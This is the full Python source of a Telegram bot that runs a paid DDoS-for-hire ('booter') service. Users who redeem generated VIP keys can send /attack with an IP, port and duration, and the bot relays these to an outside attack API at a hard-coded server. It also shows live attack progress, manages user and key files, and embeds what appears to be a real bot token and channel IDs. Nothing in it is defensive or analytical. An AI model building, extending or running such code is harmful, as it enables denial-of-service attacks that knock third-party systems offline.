import telebot
import requests
import time
import random
import string
import json
import os
import threading

# --- CONFIGURATION ---
TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
ADMIN_ID = 8787952549
CHANNEL_ID = "-1003605767830"
CHANNEL_LINK = "https://t.me/+jMe1PNQv_koxNzI1"
# Yahan check karo ki API link sahi hai ya nahi
API_URL = "http://13.203.71.127/attack"
API_KEY_DDoS = "DESTRUCTED"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# Global State
active_attacks = []
MAX_CONCURRENT = 2

def load_db(file):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_db("users.json")
keys = load_db("keys.json")

# --- CORE LOGIC ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_progress_bar(remaining, total):
    filled = int(((total - remaining) / total) * 10)
    bar = "▓" * filled + "░" * (10 - filled)
    return f"[{bar}] {int(((total - remaining) / total) * 100)}%"

# --- POWERFUL ATTACK DISPATCHER ---
def send_attack_request(target, port, duration):
    try:
        # Added timeout and verified params
        response = requests.get(
            API_URL, 
            params={"ip": target, "port": port, "time": duration, "key": API_KEY_DDoS},
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def update_progress(chat_id, msg_id, target, port, duration):
    start_time = time.time()
    # Pehle API trigger karte hain
    success = send_attack_request(target, port, duration)
    
    if not success:
        bot.edit_message_text("❌ **API SERVER ERROR**\nAttack failed to trigger on servers.", chat_id, msg_id)
        # Remove from active if failed
        global active_attacks
        active_attacks = [a for a in active_attacks if a['target'] != target]
        return

    while time.time() - start_time < duration:
        rem = int(duration - (time.time() - start_time))
        progress = get_progress_bar(rem, duration)
        try:
            bot.edit_message_text(
                f"🚀 **ATTACK IN PROGRESS** 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n🎯 **TARGET:** `{target}:{port}`\n⏳ **TIME:** `{rem}s`\n📊 **PROGRESS:** `{progress}`\n━━━━━━━━━━━━━━━━━━━━━━\n💥 **POWERED BY SASTA DEVELOPER**",
                chat_id, msg_id
            )
        except: break
        time.sleep(5)
    
    try:
        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` successfully finished.", chat_id, msg_id)
    except: pass
    
    active_attacks[:] = [a for a in active_attacks if a['target'] != target]

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    if uid not in users: users[uid] = {"expiry": 0, "username": uname}
    save_db("users.json", users)

    if is_joined(message.from_user.id):
        slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
        role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
        dashboard = (
            "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **USER:** `{message.from_user.first_name}`\n"
            f"💳 **PLAN:** `{role}`\n"
            f"🛰️ **SLOTS:** `{slots}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🛠️ **TERMINAL COMMANDS:**\n"
            "👉 /attack - Stress Target\n"
            "👉 /running - Live Attacks\n"
            "👉 /redeem - Activate Key\n"
            "👉 /myid - Your Info\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "👑 **OWNER:** @sastadeveloper"
        )
        bot.send_message(message.chat.id, dashboard, reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "❌ **JOIN CHANNEL FIRST**\n" + CHANNEL_LINK)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id): return
    if users[uid]['expiry'] < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 VIP Required."); return
    if len(active_attacks) >= MAX_CONCURRENT:
        bot.reply_to(message, "⚠️ SLOTS FULL."); return

    try:
        args = message.text.split()
        target, port, duration = args[1], args[2], int(args[3])
        active_attacks.append({"target": target, "end_time": time.time() + duration})
        
        msg = bot.send_message(message.chat.id, "🛰️ **Sending Signal to API...**")
        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
    except:
        bot.send_message(message.chat.id, "📝 `/attack <IP> <PORT> <TIME>`")

@bot.message_handler(commands=['running'])
def running(message):
    active_attacks[:] = [a for a in active_attacks if a['end_time'] > time.time()]
    if not active_attacks:
        bot.reply_to(message, "✨ No active attacks."); return
    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}**\n\n"
    for a in active_attacks:
        txt += f"🚀 `{a['target']}` | `{int(a['end_time'] - time.time())}s` left\n"
    bot.send_message(message.chat.id, txt)

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        days, count = int(args[1]), int(args[2])
        new_keys = []
        for _ in range(count):
            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            keys[k] = {"duration": days * 86400, "used_by": None}
            new_keys.append(k)
        save_db("keys.json", keys)
        bot.send_message(message.chat.id, "🎫 **KEYS:**\n`" + "\n".join(new_keys) + "`")
    except: bot.reply_to(message, "Usage: `/genkey 1 5`")

@bot.message_handler(commands=['keys'])
def show_keys(message):
    if message.from_user.id != ADMIN_ID: return
    txt = "🗝️ **KEYS:**\n"
    for k, v in keys.items():
        txt += f"`{k}` | {'Used: '+v['used_by'] if v['used_by'] else 'Unused'}\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['users'])
def show_users(message):
    if message.from_user.id != ADMIN_ID: return
    txt = "👥 **USERS:**\n"
    for uid, d in users.items():
        txt += f"`{uid}` | {d['username']}\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['redeem'])
def redeem(message):
    uid = str(message.from_user.id)
    try:
        k = message.text.split()[1]
        if k in keys and keys[k]['used_by'] is None:
            users[uid]['expiry'] = max(users[uid]['expiry'], time.time()) + keys[k]['duration']
            keys[k]['used_by'] = f"@{message.from_user.username}"
            save_db("users.json", users); save_db("keys.json", keys)
            bot.reply_to(message, "👑 **VIP ACTIVATED**")
        else: bot.reply_to(message, "❌ Invalid Key.")
    except: bot.reply_to(message, "`/redeem <KEY>`")

print("v10.0 POWER TERMINAL ONLINE...")
bot.infinity_polling()
